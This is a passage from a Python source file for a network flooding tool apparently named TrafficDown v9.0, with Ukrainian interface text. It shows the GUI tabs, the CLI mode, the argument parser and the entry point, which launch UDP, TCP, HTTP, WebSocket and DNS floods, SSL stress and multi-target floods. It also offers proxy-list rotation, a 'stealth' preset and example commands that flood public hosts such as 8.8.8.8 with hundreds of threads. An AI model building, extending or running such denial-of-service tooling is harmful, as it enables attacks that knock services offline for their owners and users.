        frame = ctk.CTkScrollableFrame(parent, fg_color="transparent")
        frame.pack(fill="both", expand=True, padx=8, pady=8)

        ctk.CTkLabel(frame, text=f"🔌 Плагіни ({PLUGINS_DIR}/)",
                      font=self.FONTS["h2"], text_color=self.gc("accent")).pack(anchor="w", padx=8, pady=4)

        discovered = plugin_manager.discover()
        if not discovered:
            ctk.CTkLabel(
                frame, text="Немає плагінів. Додайте .py файли до папки plugins/.",
                font=self.FONTS["body"], text_color=self.gc("text_subtle"),
            ).pack(anchor="w", padx=16, pady=8)
            return

        loaded = plugin_manager.list_loaded()
        for name in discovered:
            row = ctk.CTkFrame(frame, fg_color=self.gc("panel"), corner_radius=8)
            row.pack(fill="x", padx=8, pady=3)
            status = "✅ Завантажено" if name in loaded else "⬜ Не завантажено"
            ctk.CTkLabel(row, text=f"  {name}  {status}",
                          font=self.FONTS["body"], text_color=self.gc("text")).pack(side="left", padx=8, pady=8)
            ctk.CTkButton(
                row, text="▶ Запустити", width=100, height=28,
                font=self.FONTS["small"],
                fg_color=self.gc("dl"), text_color="#ffffff",
                hover_color=self.gc("accent"),
                command=lambda n=name: self._run_plugin_gui(n),
            ).pack(side="right", padx=8, pady=6)
            ctk.CTkButton(
                row, text="⬇ Load", width=70, height=28,
                font=self.FONTS["small"],
                fg_color=self.gc("border"), text_color=self.gc("text"),
                hover_color=self.gc("accent"),
                command=lambda n=name: plugin_manager.load(n),
            ).pack(side="right", padx=4, pady=6)

    def _run_plugin_gui(self, name: str) -> None:
        if name not in plugin_manager.list_loaded():
            plugin_manager.load(name)
        plugin_manager.run_plugin(name, engine)
        self.show_toast(f"Plugin '{name}' запущено.", "success")

    # ── About Tab ─────────────────────────────────────────────────────────
    def _build_about(self, parent: Any) -> None:
        frame = ctk.CTkScrollableFrame(parent, fg_color="transparent")
        frame.pack(fill="both", expand=True, padx=8, pady=8)
        ctk.CTkLabel(frame, text=f"⚡ {APP_NAME} {VERSION}",
                      font=("Segoe UI", 28, "bold"), text_color=self.gc("accent")).pack(pady=(20, 4))
        ctk.CTkLabel(frame, text=f"Build: {BUILD_DATE}  |  {PLATFORM_STR}  |  Python {sys.version.split()[0]}",
                      font=self.FONTS["body"], text_color=self.gc("text_subtle")).pack(pady=4)
        ctk.CTkLabel(frame, text="Режими v9.0:", font=self.FONTS["h2"], text_color=self.gc("accent")).pack(pady=(16, 4))
        for m in [
            "⬇ HTTP Download",
            "💥 UDP Flood",
            "⚡ TCP Flood",
            "🌐 HTTP Flood (GET/POST/HEAD)",
            "📡 Ping Test (TCP/ICMP)",
            "🔌 WebSocket Flood [NEW]",
            "🌀 DNS Flood [NEW]",
            "🔒 SSL/TLS Stress Test [NEW]",
            "🎯 Multi-Target Flood [NEW]",
        ]:
            ctk.CTkLabel(frame, text=f"  {m}", font=self.FONTS["body"],
                          text_color=self.gc("text")).pack(anchor="w", padx=24, pady=2)

    # ── Helpers ───────────────────────────────────────────────────────────
    def _apply_preset_gui(self, name: str) -> None:
        cfg.apply_preset(name)
        self._sync_sliders()
        self.show_toast(f"Пресет '{name}' застосовано.", "success")

    def _sync_sliders(self) -> None:
        for key, (sldr, lbl, lo, hi) in self.slider_data.items():
            val = int(clamp(cfg.data.get(key, lo), lo, hi))
            sldr.set(val)
            lbl.configure(text=str(val))

    def _auto_tune_gui(self) -> None:
        def _do():
            res = engine.auto_tune_threads()
            self._sync_sliders()
            try:
                self.show_toast(f"Авто-тюнінг: DL={res['threads_dl']} UDP={res['threads_ul']}", "success")
            except Exception:
                pass
        threading.Thread(target=_do, daemon=True).start()

    def _templates_dialog(self) -> None:
        tpls = cfg.list_templates()
        if not tpls:
            self.show_toast("Немає збережених шаблонів.", "warning")
            return
        # Просто завантажуємо перший знайдений шаблон (в TUI є повне меню)
        name = tpls[0]
        ok   = cfg.load_template(name)
        self._sync_sliders()
        self.show_toast(f"Шаблон '{name}' {'завантажено' if ok else 'помилка'}.", "success" if ok else "error")

    def toggle_dl(self) -> None:
        if engine.running:
            return
        engine.start_download()
        self._refresh_reports()

    def toggle_udp(self) -> None:
        if engine.running:
            return
        ip   = cfg.data.get("target_ip", "192.168.0.1")
        port = cfg.data.get("target_port", 80)
        engine.start_flood(ip, port, EngineMode.UDP_FLOOD)

    def toggle_tcp(self) -> None:
        if engine.running:
            return
        ip   = cfg.data.get("target_ip", "192.168.0.1")
        port = cfg.data.get("target_port", 80)
        engine.start_flood(ip, port, EngineMode.TCP_FLOOD)

    def toggle_http(self) -> None:
        if engine.running:
            return
        url = cfg.data.get("http_target_url", "http://192.168.0.1/")
        engine.start_http_flood(url)

    def toggle_ping(self) -> None:
        if engine.running:
            return
        ip   = cfg.data.get("target_ip", "192.168.0.1")
        port = cfg.data.get("target_port", 80)
        engine.start_ping_test(ip, port, count=200)

    def toggle_ws(self) -> None:
        if engine.running:
            return
        url = cfg.data.get("ws_target_url", "ws://192.168.0.1/")
        engine.start_ws_flood(url)

    def toggle_dns(self) -> None:
        if engine.running:
            return
        ip   = cfg.data.get("dns_target_ip", "8.8.8.8")
        port = cfg.data.get("dns_target_port", 53)
        engine.start_dns_flood(ip, port)

    def toggle_ssl(self) -> None:
        if engine.running:
            return
        host = cfg.data.get("ssl_target_host", "192.168.0.1")
        port = cfg.data.get("ssl_target_port", 443)
        engine.start_ssl_stress(host, port)

    def _stop_with_note(self) -> None:
        if engine.running:
            engine.stop(note="GUI stop")
            self._refresh_reports()
            self.show_toast("Зупинено.", "warning")

    # ── Graph drawing ─────────────────────────────────────────────────────
    def draw_graph(self) -> None:
        c    = self.graph_canvas
        w    = c.winfo_width()
        h    = c.winfo_height()
        if w < 10 or h < 10:
            return
        c.delete("all")
        c.configure(bg=self.gc("card"))

        def draw_line(data: List[float], color: str, avg_color: str) -> None:
            if not data or max(data) == 0:
                return
            max_v = max(data) or 1.0
            pts   = []
            step  = w / max(len(data) - 1, 1)
            for i, v in enumerate(data):
                x = i * step
                y = h - (v / max_v) * (h - 20) - 10
                pts.extend([x, y])
            if len(pts) >= 4:
                c.create_line(pts, fill=color, width=2, smooth=True)
            avg = sum(data) / len(data)
            ay  = h - (avg / max_v) * (h - 20) - 10
            c.create_line(0, ay, w, ay, fill=avg_color, dash=(4, 6), width=1)

        dl = engine.dl_speeds_history[-80:]
        ul = engine.ul_speeds_history[-80:]
        self._graph_dl = dl if dl else self._graph_dl
        self._graph_ul = ul if ul else self._graph_ul

        draw_line(self._graph_dl, self.gc("dl"), "#16a34a")
        draw_line(self._graph_ul, self.gc("ul"), "#991b1b")

    # ── Auto-stop watcher ─────────────────────────────────────────────────
    def _auto_stop_watcher(self) -> None:
        auto_s = cfg.data.get("auto_stop_seconds", 0)
        if engine.running and auto_s > 0 and engine.start_time is not None:
            elapsed = time.monotonic() - engine.start_time
            if elapsed >= auto_s:
                log.info(f"GUI Авто-стоп після {auto_s}с.")
                engine.stop(note="auto-stop")
                self._refresh_reports()
                self.show_toast("Автозупинка спрацювала.", "warning")
        self.root.after(1000, self._auto_stop_watcher)

    # ── Update loop ───────────────────────────────────────────────────────
    def _update_loop(self) -> None:
        try:
            self._do_update()
        except Exception as exc:
            log.debug(f"Update loop: {exc}")
        self.root.after(400, self._update_loop)

    def _do_update(self) -> None:
        stats = engine.get_stats()
        mode_color = {
            "DOWNLOADING":  self.gc("dl"),
            "UDP FLOOD":    self.gc("ul"),
            "TCP FLOOD":    self.gc("tcp"),
            "HTTP FLOOD":   self.gc("http"),
            "PING TEST":    self.gc("ping"),
            "WS FLOOD":     self.gc("ws"),
            "DNS FLOOD":    self.gc("dns"),
            "SSL STRESS":   self.gc("ssl"),
            "MULTI TARGET": self.gc("multi"),
            "IDLE":         self.gc("text_subtle"),
        }.get(stats["mode"], self.gc("text"))

        self.lbl_mode.configure(text=stats["mode"], text_color=mode_color)
        if stats["duration"] > 0:
            self.lbl_duration.configure(text=format_duration(stats["duration"]))
        else:
            self.lbl_duration.configure(text="00:00:00")

        dl_now = stats["dl_speed_now"]
        ul_now = stats["ul_speed_now"]
        self.lbl_dl_now.configure(text=format_speed(dl_now))
        self.lbl_dl_max.configure(text=f"Max: {stats['max_dl']:.2f} MB/s")
        self.lbl_dl_tot.configure(text=f"Total: {format_bytes(stats['dl'])}")
        self.lbl_ul_now.configure(text=format_speed(ul_now))
        self.lbl_ul_max.configure(text=f"Max: {stats['max_ul']:.2f} MB/s")
        self.lbl_ul_tot.configure(text=f"Total: {format_bytes(stats['ul'])}")

        self.lbl_threads.configure(
            text=f"Потоків: {stats['active_threads']}  Помилок: {stats['err']}"
        )
        err = stats["last_error"]
        self.lbl_error.configure(
            text=f"⚠ {err[:70]}" if err != "—" and stats["err"] > 0 else ""
        )

        # Latency percentiles
        p50 = stats.get("p50_ms", 0)
        p90 = stats.get("p90_ms", 0)
        p99 = stats.get("p99_ms", 0)
        self.lbl_lat_p50.configure(text=f"P50: {p50:.1f} мс")
        self.lbl_lat_p90.configure(text=f"P90: {p90:.1f} мс  P99: {p99:.1f} мс")

        try:
            cpu = psutil.cpu_percent(interval=None)
            mem = psutil.virtual_memory()
            self.lbl_cpu_ram.configure(
                text=f"CPU: {cpu:.1f}%  RAM: {mem.percent:.1f}%  ({mem.used/1024**3:.1f}/{mem.total/1024**3:.1f} GB)"
            )
        except Exception:
            pass

        ps = ping_monitor.get_stats()
        if ps["last"] is not None:
            self.lbl_ping.configure(
                text=f"RTT: {ps['last']:.1f}мс  avg {ps['avg']:.1f}  min {ps['min']:.1f}  max {ps['max']:.1f}"
            )
            self.lbl_jitter.configure(
                text=f"Jitter: {ps['jitter']:.1f}мс  Loss: {ps['loss_pct']:.1f}%  ({ps['samples']} samples)"
            )
        else:
            self.lbl_ping.configure(text="RTT: — мс")
            self.lbl_jitter.configure(text="Jitter: — мс  Loss: —%")

        sched = stats.get("scheduler", {})
        self.lbl_sched.configure(
            text=f"phase: {sched.get('phase','idle')}  elapsed: {sched.get('elapsed',0):.0f}с"
        )

        auto_s = cfg.data.get("auto_stop_seconds", 0)
        if engine.running and auto_s > 0 and engine.start_time is not None:
            pct = min(1.0, stats["duration"] / auto_s)
            self.pb_autostop.set(pct)
            remain = max(0, auto_s - stats["duration"])
            self.lbl_autostop.configure(text=f"Автозупинка за {remain:.0f}с")
        else:
            self.pb_autostop.set(0)
            self.lbl_autostop.configure(text="")

        try:
            iface = cfg.data.get("network_interface", "default")
            if iface != "default":
                counters = psutil.net_io_counters(pernic=True)
                if iface in counters:
                    c   = counters[iface]
                    t   = time.monotonic()
                    if self._iface_bytes_prev and self._iface_t_prev:
                        dt  = max(t - self._iface_t_prev, 1e-6)
                        rx  = (c.bytes_recv - self._iface_bytes_prev[0]) / dt / 1024**2
                        tx2 = (c.bytes_sent - self._iface_bytes_prev[1]) / dt / 1024**2
                        self.lbl_iface.configure(text=f"IF [{iface}] ↓{rx:.1f} ↑{tx2:.1f} MB/s")
                    self._iface_bytes_prev = (c.bytes_recv, c.bytes_sent)
                    self._iface_t_prev     = t
            else:
                self.lbl_iface.configure(text="")
        except Exception:
            pass

        self._dot_idx = (self._dot_idx + 1) % len(self._STATUS_DOTS)
        dot  = self._STATUS_DOTS[self._dot_idx] if engine.running else "●"
        self.lbl_status_dot.configure(text=dot, text_color=mode_color)

        try:
            if self.root.winfo_viewable():
                self.draw_graph()
        except Exception:
            pass

    def _toggle_theme(self) -> None:
        current   = ctk.get_appearance_mode()
        new_theme = "Light" if current == "Dark" else "Dark"
        ctk.set_appearance_mode(new_theme)
        cfg.data["theme"] = new_theme
        cfg.save()
        self._theme_key = self._detect_theme_key()

    def show_toast(self, message: str, status: str = "success") -> None:
        try:
            Toast(self.root, message, status)
        except Exception:
            pass

    def run(self) -> None:
        self.root.protocol("WM_DELETE_WINDOW", self._on_closing)
        self.root.mainloop()

    def _on_closing(self) -> None:
        log.info("Закриття GUI вікна.")
        engine.stop()
        self.root.destroy()


# ─────────────────────────────────────────────────────────────────────────────
# 7. CLI MODE
# ─────────────────────────────────────────────────────────────────────────────
def run_cli_mode(args: argparse.Namespace) -> None:
    """Запуск у CLI-режимі без TUI/GUI."""
    log.info(f"CLI-режим: mode={args.mode}")

    if args.preset:
        cfg.apply_preset(args.preset)
    if args.template:
        cfg.load_template(args.template)
    if args.threads:
        key_map = {
            "download": "threads_dl",
            "udp":      "threads_ul",
            "tcp":      "threads_tcp",
            "http":     "threads_http",
            "ws":       "threads_ws",
            "dns":      "threads_dns",
            "ssl":      "threads_ssl",
        }
        cfg.data[key_map.get(args.mode, "threads_dl")] = args.threads

    if args.target:
        try:
            parts = args.target.rsplit(":", 1)
            if len(parts) == 2:
                ip_raw, port_str = parts
                port = int(port_str)
                if not (1 <= port <= 65535):
                    raise ValueError(f"Порт {port} поза [1,65535].")
            else:
                ip_raw = parts[0]
                port   = cfg.data["target_port"]
            resolved = resolve_hostname(ip_raw, use_ipv6=args.ipv6) if not is_valid_ip(ip_raw) else ip_raw
            cfg.data["target_ip"]   = resolved
            cfg.data["target_port"] = port
        except (ValueError, socket.error) as exc:
            log.error(f"Невірна ціль '{args.target}': {exc}")
            return

    if args.proxy:
        cfg.data["proxy_url"] = args.proxy
    if getattr(args, "proxy_list", None):
        cfg.data["proxy_list"] = [p.strip() for p in args.proxy_list.split(",")]
        proxy_rotator.update(cfg.data["proxy_list"])
    if args.ipv6:
        cfg.data["use_ipv6"] = True
    if args.http_method:
        cfg.data["http_method"] = args.http_method.upper()
    if args.no_ssl_verify:
        cfg.data["ssl_verify"] = False
    if getattr(args, "ramp", None):
        cfg.data["scheduler_ramp_sec"] = args.ramp
        cfg.data["scheduler_enabled"]  = True
    if getattr(args, "webhook", None):
        cfg.data["webhook_url"] = args.webhook
    if getattr(args, "payload", None):
        cfg.data["payload_template"] = args.payload

    # Start engine by mode
    if args.mode == "download":
        engine.start_download()
    elif args.mode == "udp":
        engine.start_flood(cfg.data["target_ip"], cfg.data["target_port"], EngineMode.UDP_FLOOD)
    elif args.mode == "tcp":
        engine.start_flood(cfg.data["target_ip"], cfg.data["target_port"], EngineMode.TCP_FLOOD)
    elif args.mode == "http":
        url = getattr(args, "http_url", None) or cfg.data.get("http_target_url", "")
        if not url:
            log.error("HTTP Flood потребує --http-url.")
            return
        cfg.data["http_target_url"] = url
        engine.start_http_flood(url)
    elif args.mode == "ws":
        url = getattr(args, "ws_url", None) or cfg.data.get("ws_target_url", "")
        if not url:
            log.error("WS Flood потребує --ws-url.")
            return
        cfg.data["ws_target_url"] = url
        engine.start_ws_flood(url)
    elif args.mode == "dns":
        ip   = cfg.data.get("dns_target_ip", cfg.data["target_ip"])
        port = cfg.data.get("dns_target_port", 53)
        engine.start_dns_flood(ip, port)
    elif args.mode == "ssl":
        host = cfg.data.get("ssl_target_host", cfg.data["target_ip"])
        port = cfg.data.get("ssl_target_port", 443)
        engine.start_ssl_stress(host, port)
    elif args.mode == "ping":
        engine.start_ping_test(cfg.data["target_ip"], cfg.data["target_port"], count=args.duration)

    print(
        f"\n  {APP_NAME} {VERSION}  |  Режим: {args.mode.upper()}"
        f"  |  Ctrl+C щоб зупинити або авто-стоп через {args.duration}с\n"
        f"{'─'*78}"
    )

    start_t = time.monotonic()
    try:
        while time.monotonic() - start_t < args.duration:
            time.sleep(1)
            stats    = engine.get_stats()
            elapsed  = int(time.monotonic() - start_t)
            remain   = max(0, args.duration - elapsed)
            ps       = ping_monitor.get_stats()
            ping_str = f"{ps['last']:.0f}мс" if ps.get("last") else "—"
            p99_str  = f"{stats.get('p99_ms',0):.0f}мс"
            sched_ph = stats.get("scheduler", {}).get("phase", "—")
            print(
                f"\r  [{elapsed:>5}s/{args.duration}s -{remain:>4}s]"
                f"  DL:{format_speed(stats['dl_speed_now']):>12}"
                f"  UL:{format_speed(stats['ul_speed_now']):>12}"
                f"  Total:{format_bytes(stats['dl']):>10}"
                f"  T:{stats['active_threads']:>5}"
                f"  Err:{stats['err']:>5}"
                f"  Ping:{ping_str:>7}"
                f"  P99:{p99_str:>7}"
                f"  [{sched_ph}]   ",
                end="", flush=True,
            )
            if not engine.running:
                break
    except KeyboardInterrupt:
        log.info("CLI зупинено користувачем.")
    finally:
        print(f"\n{'─'*78}")
        engine.stop(note=args.note or "CLI run")

        if args.mode == "ping":
            pr = engine.get_ping_test_report()
            print(
                f"\n  Ping Test Results:\n"
                f"    Sent:   {pr['sent']}\n"
                f"    Recv:   {pr['recv']}\n"
                f"    Loss:   {pr.get('loss_pct', 0):.1f}%\n"
                f"    Avg:    {pr.get('avg_ms', 0):.2f} мс\n"
                f"    Min:    {pr.get('min_ms', 0):.2f} мс\n"
                f"    Max:    {pr.get('max_ms', 0):.2f} мс\n"
                f"    Jitter: {pr.get('jitter_ms', 0):.2f} мс\n"
                f"    P50:    {pr.get('p50_ms', 0):.2f} мс\n"
                f"    P90:    {pr.get('p90_ms', 0):.2f} мс\n"
                f"    P99:    {pr.get('p99_ms', 0):.2f} мс\n"
            )

        if args.output:
            report = session_history.entries[0] if session_history.entries else {}
            try:
                Path(args.output).write_text(
                    json.dumps(report, indent=4, ensure_ascii=False), encoding="utf-8"
                )
                log.info(f"Звіт збережено: {args.output}")
            except IOError as exc:
                log.error(f"Не вдалося зберегти CLI-звіт: {exc}")

        log.info("CLI-режим завершено.")


# ─────────────────────────────────────────────────────────────────────────────
# 8. АРГУМЕНТИ КОМАНДНОГО РЯДКА
# ─────────────────────────────────────────────────────────────────────────────
def build_argparser() -> argparse.ArgumentParser:
    parser = argparse.ArgumentParser(
        description=(
            f"{APP_NAME} {VERSION} — інструмент для генерації мережевого навантаження.\n"
            f"Режими: download | udp | tcp | http | ws | dns | ssl | ping"
        ),
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog=(
            "Приклади:\n"
            f"  python TrafficDown_v9_0.py --mode download\n"
            f"  python TrafficDown_v9_0.py --mode udp --target 192.168.1.1:80 --threads 200\n"
            f"  python TrafficDown_v9_0.py --mode http --http-url http://192.168.1.1/ --threads 50\n"
            f"  python TrafficDown_v9_0.py --mode ws --ws-url ws://192.168.1.1/socket\n"
            f"  python TrafficDown_v9_0.py --mode dns --target 8.8.8.8:53 --threads 500\n"
            f"  python TrafficDown_v9_0.py --mode ssl --target 192.168.1.1:443 --threads 30\n"
            f"  python TrafficDown_v9_0.py --mode ping --target 8.8.8.8:80 --duration 100\n"
            f"  python TrafficDown_v9_0.py --mode tcp --preset full --ramp 30 --duration 120\n"
            f"  python TrafficDown_v9_0.py --mode http --proxy-list proxy1:8080,proxy2:8080\n"
        ),
    )
    # Core
    parser.add_argument("--mode", type=str,
                        choices=["download", "udp", "tcp", "http", "ws", "dns", "ssl", "ping"],
                        help="Режим роботи")
    parser.add_argument("--threads", type=int, help="Кількість потоків (override)")
    parser.add_argument("--duration", type=int, default=60, help="Тривалість (сек)")
    parser.add_argument("--target", type=str, help="Ціль IP:PORT або HOST:PORT")

    # HTTP
    parser.add_argument("--http-url", type=str, dest="http_url", help="URL для HTTP Flood")
    parser.add_argument("--http-method", type=str, dest="http_method",
                        choices=["GET", "POST", "HEAD", "PUT", "DELETE"], help="HTTP метод")

    # WebSocket
    parser.add_argument("--ws-url", type=str, dest="ws_url", help="URL для WS Flood (ws:// або wss://)")

    # Presets / templates
    parser.add_argument("--preset", type=str, choices=list(PRESETS.keys()),
                        help="Пресет: quick / medium / full / stealth")
    parser.add_argument("--template", type=str, default="",
                        help="Ім'я шаблону конфігу для завантаження")

    # Proxy
    parser.add_argument("--proxy", type=str, help="Proxy URL (http://... або socks5://...)")
    parser.add_argument("--proxy-list", type=str, dest="proxy_list",
                        help="Список проксі через кому (ротація)")

    # Network options
    parser.add_argument("--ipv6", action="store_true", help="Використовувати IPv6")
    parser.add_argument("--no-ssl-verify", action="store_true", dest="no_ssl_verify",
                        help="Вимкнути SSL-верифікацію")
    parser.add_argument("--payload", type=str, choices=list(PAYLOAD_TEMPLATES.keys()),
                        help="Шаблон корисного навантаження")

    # Scheduler
    parser.add_argument("--ramp", type=int, default=0,
                        help="Час ramp-up та ramp-down (сек, 0=вимкнено)")

    # Notification
    parser.add_argument("--webhook", type=str, default="",
                        help="Webhook URL для сповіщень (Discord/Telegram/HTTP)")

    # Output
    parser.add_argument("--output", type=str, help="Шлях збереження JSON-звіту")
    parser.add_argument("--note", type=str, default="", help="Нотатка до сесії")

    # UI mode
    parser.add_argument("--no-gui", action="store_true",
                        help="Примусово консольний режим (TUI)")
    parser.add_argument("--no-splash", action="store_true",
                        help="Не показувати splash-екран у TUI")
    parser.add_argument("--csv-live", action="store_true", dest="csv_live",
                        help="Записувати live-статистику у CSV")

    return parser


# ─────────────────────────────────────────────────────────────────────────────
# 9. ТОЧКА ВХОДУ
# ─────────────────────────────────────────────────────────────────────────────
if __name__ == "__main__":
    auto_install_packages()

    parser = build_argparser()
    args   = parser.parse_args()

    if args.csv_live:
        cfg.data["csv_live_export"] = True

    try:
        if args.mode:
            run_cli_mode(args)
        else:
            if IS_WINDOWS and GUI_AVAILABLE and not args.no_gui:
                log.info("Запуск Windows GUI.")
                WindowsGUI().run()
            else:
                if IS_WINDOWS and not args.no_gui:
                    log.warning("customtkinter недоступний. Консольний TUI.")
                log.info("Запуск TUI.")
                tui = TermuxUI()
                if args.no_splash:
                    tui._splash_shown = True
                tui.run()
    except KeyboardInterrupt:
        log.info("Зупинено Ctrl+C.")
    except Exception as exc:
        log.critical(f"Критична помилка: {exc}", exc_info=True)
    finally:
        log.info("Завершення роботи...")
        engine.stop()
        print(f"\n{APP_NAME} {VERSION} завершив роботу. До побачення!\n")
        os._exit(0)
